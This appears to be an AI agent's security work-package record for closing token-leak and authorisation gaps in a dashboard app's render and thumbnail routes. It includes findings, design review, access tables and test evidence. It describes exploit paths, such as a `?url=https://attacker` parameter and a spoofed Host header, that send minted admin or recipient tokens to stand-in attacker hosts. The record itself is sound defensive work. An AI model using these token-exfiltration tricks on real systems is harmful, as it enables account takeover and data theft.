---
wp: "0i"
title: "Guard the dashboard render and thumbnail routes"
status: review
owner_role: "backend"
instances:
  - name: "backend-7"
    files:
      - web/server/routes/page_renderer.py
      - web/server/routes/views/page_renderer.py
      - web/server/routes/views/dashboard.py
      - web/server/redis/thumbnail_storage_service.py
      - web/server/api/thumbnail_storage_models.py
      - web/server/security/signal_handlers.py
      - tests/web/render/**
      - docs/modernisation/work/WP-0i.md
      - docs/modernisation/work/WP-0i-evidence/**
      - .claude/agent-memory/harmony-backend-engineer/**
branch: "mig/WP-0i-render-route-guards"
requirements: [SEC-7]
contracts_consumed: []
contracts_changed: []
security_review: true
---

# WP-0i: Guard the dashboard render and thumbnail routes

Decision 0004, phase 0 section 0i. This WP closes three exposures:

- **N1.** Anonymous callers get a thumbnail render made with the render bot's admin token.
- **N2.** Render-bot thumbnails are served from a per-slug cache to viewers whose query policy restricts them.
- **N7** (found in unit 1). A caller-chosen `url` or `cookie` sends the minted token to any page.

SEC-7 is only partly met here. WP-1h owns the resource-scoped render token and the self-hosted renderer.

## Plan

1. **Read the subsystem.** `pstack:how` on the render routes, render-token minting, the thumbnail cache, `/api2/storage/retrieve`, and the dashboard page's `view_resource` check. Check: findings below. **Done.**
2. **Write failing tests.** Tests under `tests/web/render/` with urlbox mocked. Check: red on the base for the N1, N2 and N7 reasons. **Done.**
3. **Fix it.** Every render route requires a signed-in caller with `view_resource`. `/api2/storage/retrieve` renders as the caller and caches per (dashboard, query-policy digest). The design was attacked with `pstack:interrogate`; see the decision below. Check: unit 2 green. **Done.**
4. **Retire the render bot.** No token is minted for it any more. The account itself is a carried risk, and its removal is requested. **Done.**
5. **INV-3 table.** Before and after for every outcome change. **Done**; awaiting acceptance by security and the human.
6. **WP-2b check.** Run the WP-2b pure layer against the fix in a scratch copy, and ask qa-2b to flip the N1 and N2 pins. **Done**; the request is open.

## Findings (unit 1, `pstack:how`)

- **Render routes** (`web/server/routes/page_renderer.py:82-138`): `/[<locale>/]dashboard/<slug>/pdf`, `.../<hash>/pdf`, `.../jpeg`, `.../<hash>/jpeg`, `.../png/thumbnail`. The blueprint has no decorator, and the app has no global login hook (the only `before_request` is `app.py:269`).
  - `/pdf` and `/jpeg` check `AuthorizedOperation('view_resource', ...)`, which raises 401 for anonymous and unauthorised callers alike (`authorization.py:112-121`).
  - `/png/thumbnail` (`:64-67`) checks nothing (N1).
  - A missing slug gives a 500 before the authorisation check (`:35-38`), which lets an anonymous caller enumerate slugs.
- **Token minting** (`views/page_renderer.py:68-151`): a 120 s JWT with `identity=auth_user_email`, `needs=[[view_resource, rid, dashboard]]` and `query_needs=['*']`.
  - urlbox receives it as the `accessKey` cookie. `login_from_request` (`signal_handlers.py:287-316`) logs the headless browser in as that user.
  - `_compute_token_query_needs` (`:114-162`) keeps all-values needs for a superuser, and for anyone else intersects `*` with the account's own policies. So a render as the requesting user shows exactly their data, and a render as the bot (a site admin, `scripts/create_bot_accounts.sh:5`) shows everything.
  - `auth_user_email` defaults to `settings.RENDERBOT_EMAIL`. Only two callers use that default: the thumbnail route and `/pdf` for a public-access anonymous visitor.
- **N7, new.** `SUPPORTED_RENDERING_PARAMS` (`views/page_renderer.py:21-45`) includes `url` and `cookie`, and `:133-138` copies them from `request.args`. So `?url=https://attacker` sends the freshly minted token to an attacker URL, and a crafted link can steal the clicker's token. This works on every render route, and on `/api2/storage/retrieve` too, because the thumbnail render reads the retrieve request's args.
- **Thumbnail cache.**
  - `/api2/storage/retrieve` (`api/thumbnail_storage_models.py:15-25`, under Potion's `authentication_required(is_api_request=True)`, `app.py:110`) already checks `view_resource`.
  - `retrieve_item` (`redis/thumbnail_storage_service.py:25-39`) keys the cache on the slug alone and renders as the bot, so N2 is the render identity plus the key.
  - A failed render returns `""` and leaves the key `PENDING` for 600 s. Concurrent callers sleep in a loop during that time.
- **Callers.**
  - `Overview/index.jsx:98-120` reads thumbnails only in production and only for official dashboards. The page requires login (`index.py:30`).
  - `ShareDashboardModal` links to `/pdf` and `/jpeg`, with or without the session hash.
  - Email sharing calls the render helpers directly with the sender's or each recipient's email (`views/dashboard.py:375-531`) and does not go through these routes.
  - Screenshot and iframe modes are query flags on the page itself (`template_renderer.py:155-158`).
- **The dashboard page's own check** (`routes/dashboard.py:25-75`) runs in three steps:
  - `authentication_required()`;
  - `get_dashboard(slug)` (case-insensitive), which aborts with 404 when the slug is missing;
  - `is_authorized('view_resource', 'dashboard', rid)`.
- **Public users** skip query filtering entirely (`views/query_policy.py:63`).

## Design decision (unit 3, `pstack:interrogate`)

Three reviewers (Opus, Fable, Sonnet) attacked the first design before it was built. Their consensus findings changed it as follows.

### Acted on

- **Email links were a second N7 channel** (3 of 3, critical).
  - `POST /api2/dashboard/<id>/share_via_email` takes a free-form `dashboardUrl`. urlbox loaded that URL with a token minted for each *recipient*.
  - The renderer now never takes a URL. It always builds this app's own dashboard URL with `url_for`, and keeps only the locale and the `#h=` session hash from a client link (`dashboard_page_args`).
- **Request args shaped a shared, cached thumbnail** (3 of 3): `width`, `delay`, `fail_if_selector_present` and `force`.
  - Thumbnails now ignore request args (`request_args={}`), and `force` is no longer overridable anywhere.
  - The old `request_args` bug, which assigned the whole dict to every param, is fixed.
  - Only a 200 render is cached.
- **Anonymous callers could reach retrieve** (3 of 3). Under public access, an anonymous request with a `Referer` header passed Potion's decorator. Retrieve now uses `force_authentication=True`.
- **The fingerprint must describe the policy the render actually runs under** (Fable and Sonnet; Opus raised it as drift).
  - For header-auth (`X-Username`) callers, the request identity holds raw account needs. The render token re-derives them through `_compute_token_query_needs(['*'])`, which splits complex needs per dimension and drops non-authorisable dimensions.
  - The fingerprint now digests `render_token_query_needs()`: the same derivation, run on the request identity. Superusers digest to `"superuser"`.
  - The render token's `query_needs` and the fingerprint now share the constant `RENDER_TOKEN_QUERY_NEEDS`.
- **Slugs are editable and reusable** (Fable; Opus and Sonnet flagged the key format). The key is `thumbnail:v2:<resource_id>:<sha256>`, and the lookup is case-insensitive like the dashboard page.
- **PENDING could stick after a failure, and two callers could both claim a render** (3 of 3). The claim now uses `cache.add` (SETNX on Redis), and a `finally` deletes the claim unless a 200 render was stored.
- **Secrets in logs** (Sonnet). On any non-200, urlbox failures logged `res.url`, which carries the urlbox API key and the minted JWT (INV-6). The log line now names only the format, the dashboard URL and the status.

### Rejected

- **Minting explicit `query_needs` from the caller's identity instead of `['*']`** (Fable, Opus).
  - Re-intersection would combine complex needs differently from the caller's own browsing session. That is an INV-2 risk for no gain, because the fingerprint already digests the re-derived policy.
  - The remaining drift, a policy change inside the render window, is carried to WP-1h (risk 2).
- **A per-user cache key.** It is exact, but each cold Overview load would cost one blocking urlbox render per user per official dashboard. Policy-digest keys are equally safe, because the digest is the render's own policy.

### Checked, no finding (Opus, Fable)

- Under a render token, every user's item needs reduce to view on that one dashboard.
- Thumbnails always use the default locale.
- Screenshot mode hides per-user chrome.
- So nothing besides query policy varies between users who share a digest.

## INV-3: who could do what, before and after

Statuses are measured in-process, in `tests/web/render` and with the WP-2b principals in `WP-0i-evidence/test_render_routes.flipped.py`. Each route was checked with and without `/<locale>`.

| Caller | Request | Before | After |
|---|---|---|---|
| Anonymous (public access off) | `/dashboard/<slug>/png/thumbnail` | **200**: PNG rendered as the render bot (site admin, all values), with an outbound urlbox call | 401, no outbound call |
| Anonymous (public access on, unregistered role can view the dashboard) | `/png/thumbnail` | **200**: bot render | 401, no outbound call |
| Anonymous (public access on, unregistered role can view) | `/pdf`, `/<hash>/pdf` | 200, rendered as the render bot. Public users skip query filtering on the page too (`query_policy.py:63`), so the data matched the page. | **401. Public PDF download is lost; this needs human acceptance (see Questions).** |
| Anonymous (public access on, unregistered role can view) | `/jpeg`, `/<hash>/jpeg` | 500 (`AnonymousUser` has no `username`) | 401 |
| Anonymous (public access off) | `/pdf`, `/jpeg` and hash variants | 401 | 401 (unchanged) |
| Anonymous | any render route, unknown slug | 500 (lets a caller enumerate slugs) | 401 |
| Signed in, no `view_resource` on the dashboard | `/png/thumbnail` | **200**: bot render | 403, no outbound call |
| Signed in, no `view_resource` | `/pdf`, `/jpeg` and hash variants | 401 | 403 (status code only) |
| Signed in, with `view_resource` | `/pdf`, `/jpeg` and hash variants | 200, rendered as the caller | unchanged |
| Signed in, with `view_resource` | `/png/thumbnail` | 200, rendered as the bot | 200, rendered as the caller |
| Signed in | any render route, unknown slug | 500 | 404 |
| Signed in, with `view_resource`, restricted query policy | `GET /api2/storage/retrieve?key=<slug>` | **200: thumbnail rendered as the bot (all values)**, cached per slug for 14 days and shared with everyone | 200: a thumbnail rendered under exactly the caller's render-token policy, either their own render or one by a user with the identical digest |
| Signed in, no `view_resource` | retrieve | 401 | 403 |
| Anonymous (public access on, `Referer` set, unregistered role can view) | retrieve | **200: bot thumbnail** | 401, no render |
| Any caller who may render | `?url=` or `?cookie=` on any render route or on retrieve | **minted token sent to the caller's URL**, or replaced by the caller's own | ignored |
| Any caller who may render | `?force=false` | urlbox may answer from its own cache | ignored |
| Anyone who can view the dashboard | `share_via_email` with `dashboardUrl` | **the token minted for each recipient (admins included) is sent to any URL** | renders always load this app's dashboard page; only the locale and `#h=` hash are taken from the link |
| Embedded and screenshot modes | `/dashboard/<slug>?screenshot=1`, iframe mode | page flags on the dashboard page, which checks access itself | unchanged (these do not go through the render routes) |

No other decision moved. The WP-2b pure layer is identical outside the render pins (see Evidence).

## Carried risks (for WP-1h unless noted)

1. **The render bot account still exists as a site admin in deployments.**
   - It is created by `scripts/create_bot_accounts.sh:5` (`-a`) and listed in `web/server/configuration/bots.py`.
   - No server path mints a token for it any more (`grep RENDERBOT web` is empty), so it is now an unused admin login.
   - Removing the creation line is requested below. Deactivating existing accounts is an operation on real data, so it is for the human.
2. **Policy drift during a render.**
   - The digest is computed when the retrieve request arrives. The render token (`query_needs ['*']`) is re-resolved when urlbox loads the page, up to about 5 minutes later.
   - If an admin widens a user's policy inside that window, the wider render is cached under the old digest for 14 days.
   - Separately, the 120 s token can expire mid-render (pre-existing).
   - WP-1h's self-hosted renderer should use a resource-scoped token and fix the policy when the job is enqueued.
3. **Third-party exposure (SEC-10).** Dashboard content, the viewer's email (the JWT identity) and the token all go to urlbox, with the token in the request query string.
4. **Retrieve blocks a worker.**
   - It holds the worker for up to 300 s while it renders, or spin-waits on PENDING.
   - Per-policy keys multiply cold renders by the number of distinct policies.
   - WP-1h should move this to Celery and return 202.
5. **Thumbnail renders now record a dashboard view** for the first user per policy, because `track_dashboard_access` skips only `BOT_USERS`.
   - `/pdf`, `/jpeg` and email renders already did this.
   - A render-token claim could exclude them.
6. **`share_via_email` with `useRecipientQueryPolicy=false`, or with a single thread,** renders as the sender and mails the result to every recipient. This is pre-existing product behaviour, flagged for security.
7. **`_compute_token_query_needs` splits complex query needs per dimension**, for browsing sessions and renders alike. This is a pre-existing INV-2 concern, and this WP does not change it.
8. **Legacy `thumbnail_<slug>` keys stay in Redis for up to 14 days.** New code never reads them, but a rollback would serve them again.

## Questions for the human

- **Public PDF download.**
  - Decision 0004 requires an authenticated caller on every render route.
  - On deployments with public access enabled, anonymous visitors therefore lose PDF download. JPEG already failed with a 500.
  - The PDF they got was not wider than the public page, but producing it needed a site-admin token.
  - The choice: accept the loss (this branch plus the frontend request below), or keep public PDF through a dedicated non-admin public render account as a follow-up?

## Contract changes

None.

## Requests

- [ ] **qa (qa-2b): flip the N1 and N2 pins** in `tests/authz/test_render_routes.py` on this branch.
  - A verified flipped version is at `docs/modernisation/work/WP-0i-evidence/test_render_routes.flipped.py`. It passes 15 of 15, and the full pure layer gives 4677 passed.
  - The pin harness needs three changes:
    - patch `web.server.routes.views.dashboard.get_dashboard` instead of `Transaction` on `page_renderer` and `thumbnail_storage_models`;
    - give `_Cache` the `add` and `delete` methods;
    - patch `web.server.routes.views.authentication.get_configuration`.
  - Thumbnail rows: anonymous 401, `anonymous_public` 401, `query_runner` 403, ACL viewer 200 rendered as themselves.
  - pdf and jpeg rows: `query_runner` 403, and `anonymous_public` 401 on pdf.
  - Retrieve rows:
    - the admin and the ACL viewer each get their own render (two renders);
    - the group ACL viewer shares the ACL viewer's render;
    - `query_runner` gets 403;
    - anonymous under public access gets 401.
  - This blocks review sign-off, not code.
- [ ] **frontend-design: hide "Download" from unauthenticated visitors** in `DashboardShareButton.jsx:90`, as "Email" already is, because public visitors now get 401. Needed before merge if the human accepts the public-PDF change.
- [ ] **lead:** remove the render-bot line from `scripts/create_bot_accounts.sh:5`, and decide whether to deactivate existing `renderbot@zenysis.com` admin accounts.
- [ ] **core:** remove the unused `RENDERBOT_EMAIL` from `config/settings.py:27`.
- [ ] **infra:** remove `RENDERBOT_EMAIL` from `docker-compose.yaml:136,171` and `.env.example:27`.
- [ ] **human:** accept the INV-3 table, including the public-PDF row.

## Log

- 2026-10-04 backend-7 unit 1: `pstack:how` on the render routes, token minting, the thumbnail cache and the page check; N7 found. Check: findings recorded above.
- 2026-10-04 backend-7 unit 2: 61 tests in `tests/web`, with urlbox mocked. Check: `uv run pytest tests/web` gave 43 failed and 18 passed on base `3780c8c` (`0c604a3`).
- 2026-10-04 backend-7 unit 3: the guard, the per-policy thumbnail cache, own-origin renders, no caller `url`/`cookie`/`force`, and a redacted log; the design changed after interrogate. Check: 67 passed on the branch; the same 67 tests against the base code gave 48 failed and 19 passed (`9528b22`).
- 2026-10-04 backend-7 unit 4: no render-bot token is minted, and the test env no longer sets `RENDERBOT_EMAIL`. Check: 67 passed; `grep RENDERBOT web` finds nothing (`8962db2`).
- 2026-10-04 backend-7: moved the render tests to `tests/web/render` and merged `mig/integration` (`b42a7be`). Check: `uv run pytest tests/web` gave 135 passed and 1 failed. The failure is `test_graphql_endpoint_removed` (`ModuleNotFoundError: flask_migrate`), and it fails the same way on integration.
- 2026-10-04 backend-7: the render tests now serve a `ThumbnailStorageResource` subclass, because other `tests/web` suites register the production class on their own `Api`. Check: on the web server's stack (Python 3.8, `requirements*.txt`, the same rewrite as `tests/authz/run.sh`), the whole `tests/web` tree gives 136 passed.
- 2026-10-04 backend-7 units 5-6: the INV-3 table, and the WP-2b pure layer (`24e9e88`) in scratch copies. Check: base 4672 passed; the branch with today's pins 4662 passed plus 10 render-pin errors (they patch symbols this WP removed); the branch with flipped pins 4677 passed.

## Evidence

- `docs/modernisation/work/WP-0i-evidence/tests-web-render.txt` lists the 67 passing cases by name.
- **The whole `tests/web` tree on the production stack.** Python 3.8 with `requirements.txt` and `requirements-web.txt` (the `-e git+` lines are rewritten the way `tests/authz/run.sh` does it) gives 136 passed, 67 of them from `tests/web/render`. With the project's Python 3.9 env, `uv run pytest tests/web` gives 135 passed and 1 failed. The failure is `flask_migrate` missing from that env, and it fails the same way on integration.
- **Red on base.**
  - After unit 2, `uv run pytest tests/web/render` gave 43 failed and 18 passed against `0c604a3`.
  - The final suite against the base code gave 48 failed and 19 passed. To run it, `web/server` was checked out at `0c604a3` in the worktree, then restored.
  - The 19 that pass on base are behaviour that was already correct: anonymous pdf/jpeg get 401, viewers' pdf/jpeg render as themselves, retrieve refuses anonymous callers and outsiders, and an email with no link renders.
- **WP-2b pure layer.** `tests/authz/run.sh`, Python 3.8 via uv, run in scratch copies under `/tmp/wp0i-authz` that were never committed.

  | Tree | Result |
  |---|---|
  | `mig/integration` `b42a7be` + WP-2b `24e9e88` | 4672 passed, 575 skipped |
  | branch `84a8f40` + WP-2b `24e9e88`, pins as they are today | 4662 passed, 575 skipped, 10 errors |
  | branch `84a8f40` + WP-2b `24e9e88`, with `WP-0i-evidence/test_render_routes.flipped.py` | 4677 passed, 575 skipped |

  All 10 errors are `AttributeError: ... page_renderer has no attribute 'Transaction'`: the pin harness patches the lookup this WP removed. Since 4662 + 10 = 4672, no other case moved.
- **Lint.** `uvx ruff@0.6.9 check --select E,F,W,B --line-length 100` is clean on the touched modules and `tests/web/render`. The one pyflakes F841 in `views/dashboard.py:627` is already on base.
- **Imports.** In a fresh interpreter, `web.server.security.signal_handlers` and `web.server.routes.views.page_renderer` each import first without a cycle, and `thumbnail_storage_models` imports cleanly.
- **Not run: a live render.** urlbox is never called (decision 0004). Production already shows that a dashboard page renders under a caller token holding only `view_resource` on that dashboard: `/pdf`, `/jpeg` and email renders worked that way before this WP.

## Verdicts

| Role | Verdict | Notes |
|---|---|---|
| qa | changes-requested | 2026-10-04 | 2026-10-04 qa-0i at 9059571: all three exposures closed and reproduced on branch, base and a merge with integration (render suite 67 pass on branch, 48 of them fail on base for the intended reasons; about 130-request probe matches every INV-3 row; live stacks with no egress: anonymous and outsider thumbnails 401/403 with no render attempt, unknown slug 404, failed retrieve leaves no key; WP-2b layer moves only the render pins; 8 mutants all caught; property test on cache-key sharing). Fix: tests/web/test_redis_password.py:69 fails on the merged tree (tests.web becomes a namespace package once tests/web/render/fakes is imported; pass instance_path or use bare_flask_app) then merge integration; page_renderer.py:69 url_for _external builds the render URL from the Host header (SERVER_NAME unset in production) so a spoofed Host sends recipient tokens to attacker.invalid and plants fake thumbnails for 14 days: build from DEPLOYMENT_BASE_URL or reject mismatched hosts, test with SERVER_NAME unset; page_renderer.py:160 catches builtin ConnectionError not requests exceptions so timeouts log the urlbox URL with API key and minted JWT (6 lines seen live), catch RequestException and redact; Contract changes: None is wrong, storage.retrieve.cached and unknown_slug change (WP-2c e8b5812 holds the plan, add the note); black would reformat conftest.py, fakes.py, test_render_route_guards.py; INV-3 misses unknown key 500 to 404 for signed-in callers, case-insensitive key 500 to 200, and ignored width/delay params. Gate item: public PDF Download returns raw 401 for anonymous visitors with public access on (human decision plus the frontend request). |
| reviewer | pending | |
| security | pending | |
